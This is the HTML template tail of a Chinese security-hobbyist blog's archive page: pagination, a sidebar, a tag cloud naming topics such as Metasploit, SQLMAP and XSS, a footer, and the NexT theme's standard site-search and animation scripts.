    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Healer">
            
              <p class="site-author-name" itemprop="name">Healer</p>
              <p class="site-description motion-element" itemprop="description">桃李不言，下自成蹊</p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">28</span>
                    <span class="site-state-item-name">日志</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-categories">
                  <a href="/categories/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">7</span>
                    <span class="site-state-item-name">分类</span>
                  </a>
                </div>
              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">52</span>
                    <span class="site-state-item-name">标签</span>
                  </a>
                </div>
              
            </nav>
          

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          

          

          
          

          
            
          
          

        </div>
      </div>

      
      
	<script type="text/javascript" charset="utf-8" src="/js/tagcloud.js"></script>
	<script type="text/javascript" charset="utf-8" src="/js/tagcanvas.js"></script>
	<div class="widget-wrap">
	    <h3 class="widget-title">Tag Cloud</h3>
	    <div id="myCanvasContainer" class="widget tagcloud">
		<canvas width="250" height="250" id="resCanvas" style="width=100%">
		    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARP欺骗/">ARP欺骗</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASLR/">ASLR</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ASP/">ASP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CMD/">CMD</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DEP/">DEP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ettercap/">Ettercap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GDB/">GDB</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IDA/">IDA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/KALI/">KALI</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MARKDOWN/">MARKDOWN</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MS08-067/">MS08-067</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MS12-004/">MS12_004</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Meatsploit/">Meatsploit</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Metasploit/">Metasploit</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Nmap/">Nmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/">PWN</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWNTOOLS/">PWNTOOLS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Requests/">Requests</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/">Reverse</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Revese/">Revese</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLMAP/">SQLMAP</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VMware-Tools/">VMware Tools</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/W3AF/">W3AF</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Writeup/">Writeup</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/arpspoof/">arpspoof</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/canary/">canary</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/driftnet/">driftnet</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gef/">gef</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/meterpreter/">meterpreter</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/objdump/">objdump</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/peda/">peda</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwndbg/">pwndbg</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/re/">re</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellcode/">shellcode</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/反爬虫/">反爬虫</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/图片/">图片</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/堆/">堆</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/数据库注入/">数据库注入</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/断网攻击/">断网攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/更新源/">更新源</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/木马/">木马</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/栈/">栈</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/正则表达式/">正则表达式</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/磁盘分区合并/">磁盘分区合并</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/逆向/">逆向</a><span class="tag-list-count">1</span></li></ul>
		</canvas>
	    </div>
	</div>
	
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love" id="animate">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Healer</span>

  

  
</div>

<div class="powered-by">
<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
  本站访客数:<span id="busuanzi_value_site_pv"></span>
</span><span class="post-meta-divider">|</span>
</div>


  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v6.7.0</div>




        








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
          <span id="scrollpercent"><span>0</span>%</span>
        
      </div>
    

    

    

    
  </div>

  

<script>
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>














  
    
    
  
  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>













  
  <script src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>


  


  <script src="/js/src/utils.js?v=6.7.0"></script>

  <script src="/js/src/motion.js?v=6.7.0"></script>



  
  


  <script src="/js/src/affix.js?v=6.7.0"></script>

  <script src="/js/src/schemes/pisces.js?v=6.7.0"></script>




  

  


  <script src="/js/src/bootstrap.js?v=6.7.0"></script>



  




  

  <script>
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  

  

  

  

  

  

  

  

  

  

  
  <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
  
</body>
</html>
